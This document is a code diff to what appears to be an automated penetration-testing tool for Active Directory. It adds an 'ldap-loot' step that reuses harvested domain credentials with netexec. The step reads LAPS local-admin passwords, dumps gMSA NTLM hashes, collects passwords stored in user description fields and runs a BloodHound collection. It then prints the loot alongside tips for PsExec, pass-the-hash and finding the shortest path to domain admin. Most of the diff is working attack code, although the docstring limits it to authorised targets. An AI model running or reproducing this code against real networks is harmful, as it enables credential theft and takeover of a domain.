@@ -2337,6 +2337,24 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
         return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL" if admin else "HIGH",
                 "summary": f"MSSQL creds: {shown}"[:140]}
 
+    # 2bw) ldap-loot: LAPS/gMSA creds (high) > description secrets > bloodhound
+    if sid == "ldap-loot":
+        laps = re.findall(r"^✗ LAPS (\S+)", output, re.M)
+        gmsa = re.findall(r"^✗ GMSA (\S+)", output, re.M)
+        descs = re.findall(r"^✗ DESC ", output, re.M)
+        if laps or gmsa:
+            bits = []
+            if laps:
+                bits.append(f"LAPS: {', '.join(laps[:3])}")
+            if gmsa:
+                bits.append(f"gMSA: {', '.join(gmsa[:3])}")
+            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                    "summary": f"AD loot — {'; '.join(bits)}"[:140]}
+        if descs:
+            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
+                    "summary": f"AD: {len(descs)} password(s) in description fields"[:140]}
+        return None
+
     # 2bv) ldap-roast: AS-REP / Kerberoast hashes → offline crack to domain creds
     if sid == "ldap-roast":
         asrep = re.findall(r"^✗ ASREP (\S+)", output, re.M)
@@ -3532,11 +3550,10 @@ _EXPLOIT_STEPS = {
     "ldap": [
         # ── enumerate ──
         ("Bind (anon / reused cred) → domain, users, AS-REP flags, password policy", "ldap-enum"),
-        "Map attack paths with BloodHound (LDAP collector) — ACLs, sessions, GPOs, delegation",
         # ── roast targets ──
         ("AS-REP roast (no creds) + Kerberoast (any cred) → crackable hashes", "ldap-roast"),
         # ── loot secrets from LDAP ──
-        "Read LAPS (ms-Mcs-AdmPwd) and gMSA passwords (ReadGMSAPassword) where allowed",
+        ("Loot: LAPS + gMSA + description secrets + BloodHound collect", "ldap-loot"),
         # ── ACL & object abuse (write rights) ──
         "ACL abuse: GenericAll/Write, WriteDACL/Owner, ForceChangePassword, AddMember (bloodyAD / dacledit)",
         "Shadow credentials: write msDS-KeyCredentialLink → PKINIT auth (pywhisker / certipy)",
@@ -14271,6 +14288,51 @@ def _tool_ldap_roast(ip: str, port: int, proto: str) -> str:
     return f"LDAP roast — {ip}:{port}\n\n" + "\n".join(lines)
 
 
+# ── LDAP step 3: loot — LAPS, gMSA, user-description secrets, BloodHound collect ─
+def _tool_ldap_loot(ip: str, port: int, proto: str) -> str:
+    """LDAP step 3 tool: with a domain cred, read LAPS local-admin passwords (ms-Mcs-AdmPwd) and
+    gMSA passwords where the ACL allows, harvest passwords stuffed in user description fields, and
+    kick off a BloodHound collection for offline attack-path analysis. netexec ldap. Needs a domain
+    cred (not anonymous) + netexec → raises otherwise. Authorised targets only."""
+    if not (shutil.which("netexec") or shutil.which("nxc")):
+        raise RuntimeError("netexec (nxc) required for LDAP loot")
+    domcreds = [(d, u, s) for d, u, s in _gather_all_smb_creds() if s]
+    if not domcreds:
+        raise RuntimeError("no domain cred — LAPS/gMSA need an authenticated bind "
+                           "(reuse an SMB cred or crack a roast hash first)")
+    user, secret = domcreds[0][1], domcreds[0][2]
+
+    rc, lout = _ldap_run(ip, port, user, secret, ["--laps"], timeout=120)
+    if rc is None:
+        raise RuntimeError(f"{ip}:{port} — netexec ldap did not run (down / not a DC?)")
+    laps = re.findall(r"Computer:\s*(\S+)\s+.*?Password:\s*(\S+)", lout)
+
+    _rc, gout = _ldap_run(ip, port, user, secret, ["--gmsa"], timeout=120)
+    gmsa = re.findall(r"Account:\s*(\S+)\s+NTLM:\s*(\S+)", gout)
+
+    _rc, dout = _ldap_run(ip, port, user, secret, ["-M", "get-desc-users"], timeout=120)
+    descs = re.findall(r"User:\s*(\S+)\s+description:\s*(.+)", _nxc_body(dout))
+    descs = [(u, d.strip()) for u, d in descs
+             if d.strip() and not re.fullmatch(r"(?i)(built-in account.*|none|n/a)", d.strip())]
+
+    _rc, bhout = _ldap_run(ip, port, user, secret, ["--bloodhound", "--collection", "all",
+                                                    "--dns-server", ip], timeout=_LDAPENUM_DEADLINE)
+    bh_ok = bool(re.search(r"(?i)compressing|written to|\.zip", bhout))
+
+    lines = [f"[*] as {user} · LAPS {len(laps)} · gMSA {len(gmsa)} · desc {len(descs)}"]
+    for comp, pw in laps[:20]:
+        lines.append(f"✗ LAPS {comp} {pw}  (local admin — PsExec / runas)")
+    for acc, h in gmsa[:20]:
+        lines.append(f"✗ GMSA {acc} {h[:40]}  (service account — PtH / crack)")
+    for u, d in descs[:20]:
+        lines.append(f"✗ DESC {u}: {d[:70]}")
+    if bh_ok:
+        lines.append("· BloodHound data collected → analyze paths in the GUI (Shortest Path to DA)")
+    if not (laps or gmsa or descs):
+        lines.append("· no LAPS/gMSA/desc secrets for this cred — run BloodHound and hunt ACL paths (ldap-next)")
+    return f"LDAP loot — {ip}:{port}\n\n" + "\n".join(lines)
+
+
 # ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
 # service surfaced. A router: it detects which of this host's services have a viable path to a
 # shell (from findings already in the DB) and dispatches to that service's existing foothold tool
@@ -14437,6 +14499,7 @@ _STEP_TOOLS = {
     "ssh-next": ("manual SSH steps (context-aware, reference only)", _tool_ssh_next),
     "ldap-enum": ("AD enum via netexec ldap — domain, users, AS-REP flags, password policy", _tool_ldap_enum),
     "ldap-roast": ("AS-REP roast + Kerberoast → crackable hashes (netexec ldap)", _tool_ldap_roast),
+    "ldap-loot": ("LAPS + gMSA + description secrets + BloodHound collect (netexec ldap)", _tool_ldap_loot),
     "spawn-shell": ("spawn a shell — router across all service footholds (interactive)", _tool_spawn_shell),
 }
 
@@ -14537,6 +14600,7 @@ _STEP_TOOL_RUNS = {
     "ssh-next":         ("reference · no scan", None),
     "ldap-enum":        ("netexec ldap", f"{_mins(_LDAPENUM_DEADLINE)} min"),
     "ldap-roast":       ("netexec ldap", None),
+    "ldap-loot":        ("netexec ldap", f"{_mins(_LDAPENUM_DEADLINE)} min"),
     "spawn-shell":      ("router → service foothold", None),
 }
 
